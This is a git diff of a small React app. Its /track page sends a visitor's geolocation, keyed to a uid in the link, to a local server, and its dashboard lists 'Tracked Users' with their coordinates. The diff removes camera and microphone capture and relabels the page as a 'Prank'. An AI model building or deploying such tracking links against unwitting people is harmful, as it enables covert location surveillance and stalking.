@@ -1,89 +1,8 @@
-// import React, { useEffect, useRef, useState } from "react";
-// import axios from "axios";
-
-// function App() {
-//   const videoRef = useRef(null);
-//   const [mode, setMode] = useState("dashboard"); // default
-//   const uid = new URLSearchParams(window.location.search).get("uid");
-
-//   // Mode switch based on route
-//   useEffect(() => {
-//     if (window.location.pathname === "/track") {
-//       setMode("track");
-//     }
-//   }, []);
-
-//   useEffect(() => {
-//     if (mode === "track") {
-//       // Geolocation
-//       navigator.geolocation.getCurrentPosition((position) => {
-//         axios.post("http://localhost:5000/api/location", {
-//           uid: uid || "unknown-user",
-//           lat: position.coords.latitude,
-//           lng: position.coords.longitude,
-//         });
-//       });
-
-//       // Camera + Mic
-//       navigator.mediaDevices
-//         .getUserMedia({ video: true, audio: true })
-//         .then((stream) => {
-//           if (videoRef.current) {
-//             videoRef.current.srcObject = stream;
-//           }
-//         })
-//         .catch((err) => {
-//           console.error("Error accessing media:", err);
-//         });
-//     }
-//   }, [mode]);
-
-//   // Dashboard View
-//   const [locations, setLocations] = useState([]);
-
-//   useEffect(() => {
-//     if (mode === "dashboard") {
-//       axios.get("http://localhost:5000/api/locations").then((res) => {
-//         setLocations(res.data);
-//       });
-//     }
-//   }, [mode]);
-
-//   if (mode === "track") {
-//     return (
-//       <div style={{ padding: "2rem" }}>
-//         <h2>📹 You are sharing your camera and mic</h2>
-//         <video ref={videoRef} autoPlay playsInline width="500" muted />
-//         <p>Your location has been shared successfully!</p>
-//       </div>
-//     );
-//   }
-
-//   // Dashboard view
-//   return (
-//     <div style={{ padding: "2rem" }}>
-//       <h1>📍 Tracked Users</h1>
-//       <ul>
-//         {locations.map((loc) => (
-//           <li key={loc._id}>
-//             <strong>{loc.uid}</strong> – Lat: {loc.latitude}, Lng: {loc.longitude} –{" "}
-//             {new Date(loc.timestamp).toLocaleString()}
-//           </li>
-//         ))}
-//       </ul>
-//     </div>
-//   );
-// }
-
-// export default App;
-
-
 import React, { useEffect, useRef, useState } from "react";
 import axios from "axios";
-import { Video, MapPin } from "lucide-react";
+import { MapPin } from "lucide-react";
 
 function App() {
-  const videoRef = useRef(null);
   const [mode, setMode] = useState("dashboard");
   const [locations, setLocations] = useState([]);
   const uid = new URLSearchParams(window.location.search).get("uid");
@@ -103,17 +22,6 @@ function App() {
           lng: position.coords.longitude,
         });
       });
-
-      navigator.mediaDevices
-        .getUserMedia({ video: true, audio: true })
-        .then((stream) => {
-          if (videoRef.current) {
-            videoRef.current.srcObject = stream;
-          }
-        })
-        .catch((err) => {
-          console.error("Error accessing media:", err);
-        });
     }
   }, [mode]);
 
@@ -129,18 +37,10 @@ function App() {
     return (
       <div className="min-h-screen bg-gray-900 text-white flex flex-col items-center justify-center p-6">
         <div className="text-center">
-          <Video className="w-12 h-12 mx-auto animate-pulse" />
-          <h2 className="text-2xl font-semibold mt-2">You are sharing your camera and mic</h2>
+          <MapPin className="w-12 h-12 mx-auto text-green-400 animate-bounce" />
+          <h2 className="text-2xl font-semibold mt-2">Prank</h2>
+          <p className="text-green-400 mt-2">✅ Thank you!</p>
         </div>
-        {/* <video
-          ref={videoRef}
-          autoPlay
-          playsInline
-          width="600"
-          muted
-          className="rounded-lg mt-6 shadow-lg"
-        /> */}
-        <p className="mt-4 text-green-400 font-medium">✅ Best Wishes to you!</p>
       </div>
     );
   }
